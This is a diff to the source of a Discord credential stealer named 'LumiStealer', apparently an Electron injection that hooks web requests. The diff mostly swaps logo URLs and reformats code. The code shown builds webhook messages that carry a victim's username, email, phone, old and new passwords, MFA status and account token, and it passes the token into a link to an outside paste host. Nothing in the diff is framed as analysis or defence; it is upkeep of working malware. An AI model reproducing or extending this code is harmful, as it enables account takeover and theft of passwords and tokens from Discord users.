@@ -546,7 +546,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
           icon_url: userAvatar
         },
         footer: {
-          icon_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png",
+          icon_url: "https://i.pinimg.com/564x/7d/8e/86/7d8e86430309353281a9d78ad71c4228.jpg",
           text: "LumiStealer"
         },
         timestamp: dataNow,
@@ -557,7 +557,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const dataLogin3 = {
         embeds: [embedLogin3],
         username: "Logins - LumiSt2aler",
-        avatar_url: "https://cdn.discordapp.com/attachments/1249450764330471547/1249491645318041693/Cream_Black_Modern_Monogram_Initial_Name_Logo.png"
+        avatar_url: "https://i.pinimg.com/564x/7d/8e/86/7d8e86430309353281a9d78ad71c4228.jpg"
       }
 
       await sendWebhook(webhook, dataLogin3);
@@ -654,58 +654,58 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         return true
       }
 
-const embedNewPasswd = {
-    title: "Password Changed - LumiStealer",
-    color: 0x5a0998,
-    fields: [
-        {
-            name: "<:friends:1249813642879303711> User",
-            value: "`" + user.username + "`",
+      const embedNewPasswd = {
+        title: "Password Changed - LumiStealer",
+        color: 0x5a0998,
+        fields: [
+          {
+            name: "User",
+            value: "`"+user.username+"`",
             inline: true
-        },
-        {
-            name: "<:aaaaaaa:1249820962463944745> ID",
-            value: "`" + user.id + "`",
+          },
+          {
+            name: "ID",
+            value: "`"+user.id+"`",
             inline: true
-        },
-        {
-            name: "<:zanybooster:1248262436482711733> Nitro",
+          },
+          {
+            name: "Nitro",
             value: GetNitro(Nitro),
             inline: true
-        },
-        {
-            name: "<:emoji_54:1249821065236975686> Email",
-            value: "`" + user.email + "`",
+          },
+          {
+            name: "Email",
+            value: "`"+user.email+"`",
             inline: true
-        },
-        {
-            name: "<:c_ip2:1249821011898269706> Phone",
-            value: "`" + user.phone + "`",
+          },
+          {
+            name: "Phone",
+            value: "`"+user.phone+"`",
             inline: true
-        },
-        {
-            name: "<:badge:1249821267104759959> Badges",
+          },
+          {
+            name: "Badges",
             value: GetBadges(user.public_flags),
             inline: true
-        },
-        {
+          },
+          {
             name: "Old Password",
-            value: "`" + old_passwd + "`",
+            value: "`"+old_passwd+"`",
             inline: true
-        },
-        {
+          },
+          {
             name: "New Password",
-            value: "`" + new_passwd + "`",
+            value: "`"+new_passwd+"`",
             inline: true
-        },
-        {
-            name: "<:jptstaff1:1235646259839107193> MFA",
+          },
+          {
+            name: "MFA",
             value: GetA2F(user.mfa_enabled),
             inline: true
-        },
-        {
+          },
+          {
             name: "New Token",
-            value: "||" + new_token + "||\n[Copy Token](https://paste-pgpj.onrender.com/?p=" + new_token + ")",
+            value: "||"+new_token+"||\n[Copy Token](https://paste-pgpj.onrender.com/?p="+new_token+")",
             inline: true
           },
         ],
